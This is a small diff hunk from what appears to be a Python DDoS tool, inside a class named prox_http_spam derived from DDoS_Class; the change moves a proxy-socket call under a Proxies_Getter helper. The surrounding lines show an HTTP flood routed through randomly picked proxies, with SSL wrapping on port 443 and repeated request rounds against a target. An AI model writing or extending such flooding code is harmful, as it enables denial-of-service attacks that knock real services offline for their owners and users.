@@ -73,7 +73,7 @@ class prox_http_spam(DDoS_Class):
                     break
                 try:
                     proxy=random.choice(self.proxies)
-                    s=get_proxy_socket(self.target,self.port,timeout=self.timeout,**proxy)
+                    s=Proxies_Getter.get_proxy_socket(self.target,self.port,timeout=self.timeout,**proxy)
                     if self.port==443 or self.ssl_on==True:
                         s=wrap_socket_with_ssl(s,self.target)
                     for l in range(random.randint(self.round_min, self.round_max)):
